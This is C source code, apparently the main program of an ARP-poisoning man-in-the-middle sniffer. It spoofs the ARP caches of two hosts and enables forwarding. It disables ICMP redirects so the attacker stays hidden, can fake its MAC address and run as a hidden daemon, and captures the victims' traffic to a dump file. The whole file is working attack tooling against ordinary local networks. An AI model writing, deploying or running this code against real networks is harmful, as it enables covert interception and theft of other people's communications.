#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/select.h>

#ifdef __MACH__
  #include <sys/sysctl.h>
#endif

#include <main.h>
#include <arp_cache.h>
#include <filter.h>
#include <interface.h>
#include <receive.h>
#include <send.h>
#include <strat.h>
#include <format.h>

void usage(char* command) {
  printf("Usage: %s [options] <target1_ipv4> <target2_ipv4> [filter_rule]\n", command);
  printf("Options:\n -d put process in background\n -s use a different ether address\n -f <dump_file>\n");
}

int main(int argc, char* const argv[]) {
  u_int8_t flags = 0;
  struct rule_node* rule; // filter rule
  char* dump_file;
  int pip[2]; // pipe for inter-thread communication
  int i, j, error_num;

  if(geteuid()) {
    fprintf(stderr,"No root, no service\n");
    return 1;
  }

  /* Parse arguments */
  i = 1;
  while(i < argc && argv[i][0] == '-') { // Compute options
    switch(argv[i][1]) {
      case 'd':
        flags |= SPF_DAEMON;
        break;
      case 's':
        flags |= SPF_MAC_ADDR;
        break;
      case 'f':
        flags |= SPF_DUMP_FILE;
        if(++i < argc) dump_file = argv[i];
        else {
          fprintf(stderr, "You must specify a dump file after -f\n");
          return 1;
        }
        break;
      default:
        fprintf(stderr, "Unknown argument -%c\n", argv[i][1]);
        return 1;
    }
    i ++;
  }

  if(i + 1 >= argc) {
    usage(argv[0]);
    return 0;
  }

  // Parse targets addresses
  for(j = 0; j < 2; j ++) {
    struct in_addr tmp;
    uint32_t* target_addr = (j ? &(context.target_2_ip) : &(context.target_1_ip));
    if(inet_aton(argv[i + j], &tmp) == 0) {
        fprintf(stderr, "Invalid address %s\n", argv[i + j]);
        return 1;
    }
    *target_addr = tmp.s_addr;
  }

  // Just in case
  if(context.target_1_ip == context.target_2_ip) {
    fprintf(stderr, "This will not work\n");
    return 1;
  }

  /* Parse capture filter rule */
  j = 0;
  char* raw_rule = malloc(sizeof(char) * MAX_FILTER_RULE_LEN);
  if(!raw_rule) {
    perror("malloc");
    return 1;
  }
  raw_rule[0] = 0;
  for(i = i + 2; i < argc; i ++) {
    size_t len = strlen(argv[i]);
    if(j + len + (j != 0) < MAX_FILTER_RULE_LEN) {
      if(j != 0) {
        raw_rule[j] = ' ';
        j++;
      }
      strcpy(raw_rule + j, argv[i]);
      j += len;
    } else {
      fprintf(stderr, "Filter rule of more than %u characters not supported\n", MAX_FILTER_RULE_LEN-1);
      return 1;
    }
  }

  if(raw_rule[0] == 0) strcpy(raw_rule, "ip"); // Default rule

  if(parseRule(raw_rule, &rule)) return 1;
  free(raw_rule);

  // Find appropriate network interface
  if(!(context.our_ip = getSuitableInterface(context.target_1_ip, context.target_2_ip, context.interface_name))) {
    fprintf(stderr, "No network found containing both %s and %s\n", argv[1], argv[2]);
    return 1;
  }

  // add filter rule to filter any traffic not spoofed
  if(addSrcIp(rule, context.our_ip)) return 1;

  // use interface real MAC address, if -s not specified
  if(!(flags & SPF_MAC_ADDR)) {
    if(getInterfaceEther(context.interface_name, context.our_ether)) {
      fprintf(stderr, "Error, not able to find interface MAC address\n");
      return 1;
    }
  } else memcpy(context.our_ether, SPY_ETHER, 6);

  printf("Binding on interface %s, %u.%u.%u.%u[%x:%x:%x:%x:%x:%x]\n", context.interface_name,
    ((uint8_t*)&context.our_ip)[0], ((uint8_t*)&context.our_ip)[1], ((uint8_t*)&context.our_ip)[2], ((uint8_t*)&context.our_ip)[3],
    context.our_ether[0], context.our_ether[1], context.our_ether[2], context.our_ether[3], context.our_ether[4], context.our_ether[5]);

  // Init raw socket to send arp frames
  if(init_raw_sock(context.interface_name)) return 1;
  // Init capture device
  if(init_capture_fd(context.interface_name)) return 1;

  printf("Asking targets for their MAC address...\n");

  // Start targets MAC identifier thread
  pthread_t identifier;
  if(pipe(pip) == -1) {
    perror("pipe ");
    return 1;
  }
  struct identifier_arg_t identifier_args = {
    .ip_1 = context.target_1_ip,
    .ip_2 = context.target_2_ip,
    .ret_ether_1 = &(context.target_1_ether[0]),
    .ret_ether_2 = &(context.target_2_ether[0]),
    .pip = pip[1]
  };

  if((error_num = pthread_create(&identifier, NULL, target_identifier, (void*)(&identifier_args)))) {
    fprintf(stderr, "pthread_create: %s\n", strerror(error_num));
    return 1;
  }

  /* Send arp who-has request to targets, loop if no answer received */
  fd_set set;
  struct timeval interval;

  uint8_t state = 0;
  int8_t cstate;
  do {
    if(! (state & 1)) {
      send_arp_request(context.our_ip, context.our_ether, context.target_1_ip, (uint8_t*)mac_broadcast);
    }
    if(! (state & 2)) {
      send_arp_request(context.our_ip, context.our_ether, context.target_2_ip, (uint8_t*)mac_broadcast);
    }

    // Need to be reset for each select
    FD_ZERO(&set);
    FD_SET(pip[0], &set);
    memset(&interval, 0, sizeof(interval));
    interval.tv_sec = ID_RETRY_INT;

    while(state < 3 && (cstate = select(pip[0] + 1, &set, NULL, NULL, &interval))) {

      if(cstate == -1) {
        perror("select ");
        return 1;
      }
      if(read(pip[0], &cstate, 1) == -1) {
        perror("read ");
        return 1;
      }
      state |= (uint8_t)cstate;

      switch(cstate) {
        case 1:
          printf("Target 1 is %u.%u.%u.%u[%x:%x:%x:%x:%x:%x]\n",
            ((u_int8_t*)&(context.target_1_ip))[0], ((u_int8_t*)&(context.target_1_ip))[1], ((u_int8_t*)&(context.target_1_ip))[2], ((u_int8_t*)&(context.target_1_ip))[3],
            context.target_1_ether[0], context.target_1_ether[1], context.target_1_ether[2], context.target_1_ether[3], context.target_1_ether[4], context.target_1_ether[5]);
        break;
        case 2:
          printf("Target 2 is %u.%u.%u.%u[%x:%x:%x:%x:%x:%x]\n",
            ((u_int8_t*)&(context.target_2_ip))[0], ((u_int8_t*)&(context.target_2_ip))[1], ((u_int8_t*)&(context.target_2_ip))[2], ((u_int8_t*)&(context.target_2_ip))[3],
            context.target_2_ether[0], context.target_2_ether[1], context.target_2_ether[2], context.target_2_ether[3], context.target_2_ether[4], context.target_2_ether[5]);
        break;
      }
    }
  } while(state < 3);

  pthread_join(identifier, NULL);

  if(state & 4) {
    fprintf(stderr, "Error in identifier thread, exiting\n");
    return 1;
  }

  /* Signals handler */
  if(signal(SIGINT, signal_exit) == SIG_ERR) {
    fprintf(stderr, "Cannot bind routine for signal SIGINT (SIG_ERR)\n");
    return 1;
  }
  if(signal(SIGTERM, signal_exit) == SIG_ERR) {
    fprintf(stderr, "Cannot bind routine for signal SIGTERM (SIG_ERR)\n");
    return 1;
  }

  /* Exit routine */
  if(atexit(exit_routine)) {
    fprintf(stderr, "atexit error\n");
    return 1;
  }

  // disable the sending of ICMP redirects
  #ifdef __linux__
    if(enable_icmp_redirect_on_interface(0, "all")) return 1;
    if(enable_icmp_redirect_on_interface(0, context.interface_name)) return 1;
  #elif __MACH__
    if(enable_icmp_redirect(0)) return 1;
  #endif

  // Setting permanent arp entries - avoid annoying arp request from us, showing our real ip addr
  context.flags |= PERMANENT_T1;
  add_arp_entry(context.target_1_ether, (u_int8_t*)&(context.target_1_ip));
  context.flags |= PERMANENT_T2;
  add_arp_entry(context.target_2_ether, (u_int8_t*)&(context.target_2_ip));

  // define poisoning strategy for each target
  if(define_spoof_strategy(&context)) return 1;

  /* Enable routing on host */
  context.flags |= TARGETS_SPOOFED;
  if(enable_forwarding(1)) return 1;

  // refresh poisoning
  spoof_target(&context, 1);
  spoof_target(&context, 2);

  // Set process as background daemon if needed
  if(flags & SPF_DAEMON) {
    printf("Going into backgroung. bye.\n");
    // Close input, redirect output
    int output_fd, input_fd;
    if((output_fd = open(DAEMON_LOG_FILE, O_APPEND | O_WRONLY | O_CREAT, 0644)) == -1) {
      perror("open "DAEMON_LOG_FILE);
      return 1;
    }
    if((input_fd = open("/dev/null", O_RDONLY)) == -1) {
      perror("open /dev/null ");
      return 1;
    }
    close(0); close(1); close(2);
    dup(input_fd); dup(output_fd); dup(output_fd);

    // Fork and new session id
    if(!fork()) {
      if(setsid() == -1) {
        perror("setsid ");
        return 1;
      }
    } else { // End the parent
      _exit(0);
    }
  }

  // create capture dump file
  if(flags & SPF_DUMP_FILE) {
    if(open_capture(dump_file)) return 1;
  } else {
    if(open_new_capture()) return 1;
  }

  // Set up refresh loop thread - refresh the poisonning
  pthread_t refresh_thread;
  struct poison_loop_arg_t loop_arg = {
    .context = &context,
    .pip = pip[0]
  };
  if((error_num = pthread_create(&refresh_thread, NULL, poison_loop, (void*)(&loop_arg)))) {
    fprintf(stderr, "pthread_create: %s\n", strerror(error_num));
    return 1;
  }

  // Apply capture filter
  if(apply_filter(rule, context.target_1_ether, context.target_2_ether)) return 1;

  // Start the capture job
  struct capture_arg_t capture_args = {
    .ether_1 = context.target_1_ether,
    .ether_2 = context.target_2_ether,
    .ip_1 = context.target_1_ip,
    .ip_2 = context.target_2_ip,
    .filter = rule,
    .pip = pip[1]
  };
  capture(capture_callback, (void*)&capture_args);

  pthread_join(refresh_thread, NULL);

  close(pip[0]); close(pip[1]);

  freeRule(rule);

  return 0;
}

void signal_exit(int signal) {
  exit(0);
}

void exit_routine() {
  /* Disable routing and enable ICMP redirect */
  if(enable_forwarding(0)) {
    fprintf(stderr, "Warning: IPv4 packets forwarding not disabled successfully\n");
  }
  #ifdef __MACH__
    if(enable_icmp_redirect(1)) {
      fprintf(stderr, "Warning: sending of ICMP redirects not enabled successfully\n");
    }
  #elif __linux__
    if(context.interface_name[0]) {
        if(enable_icmp_redirect_on_interface(1, "all") || enable_icmp_redirect_on_interface(1, context.interface_name)) {
          fprintf(stderr, "Warning: sending of ICMP redirects not enabled successfully on %s\n", context.interface_name);
        }
    }
  #endif
  /* Remove arp permanent entries */
  if(context.flags & PERMANENT_T1) {
    while(! del_arp_entry((uint8_t*)&(context.target_1_ip)));
  }
  if(context.flags & PERMANENT_T2) {
    while(! del_arp_entry((uint8_t*)&(context.target_2_ip)));
  }

  // restore targets arp cache
  if(context.flags & TARGETS_SPOOFED) {
    send_arp_reply(context.target_2_ip, context.target_2_ether, context.target_1_ip, context.target_1_ether);
    send_arp_reply(context.target_1_ip, context.target_1_ether, context.target_2_ip, context.target_2_ether);
  }

  uint32_t recv, cap, drop;
  if(!get_capture_stats(&recv, &cap, &drop)) {
    printf("\n%u packets captured\n%u packets received by filter\n%u packets dropped by kernel\n", cap, recv, drop);
  }

  close_capture();
}

int manage_system_conf(uint8_t enable, char* conf_name) {
  #ifdef __linux__
    FILE* net_file;
    if(!(net_file = fopen(conf_name, "w"))) {
      fprintf(stderr, "Error can not open %s\n", conf_name);
      return 1;
    }
    fprintf(net_file, "%hhu", enable);
    fclose(net_file);
  #elif __MACH__
    int sysctl_value = enable;
    if(sysctlbyname(conf_name, NULL, NULL, &sysctl_value, sizeof(int))) {
      perror("sysctlbyname");
      return 1;
    }
  #endif
  return 0;
}

#ifdef __linux__
  int enable_icmp_redirect_on_interface(uint8_t enable, char* ifname) {
    char buff[40 + IFNAMSIZ];
    sprintf(buff, "/proc/sys/net/ipv4/conf/%s/send_redirects", ifname);
    return manage_system_conf(enable, buff);
  }
#endif
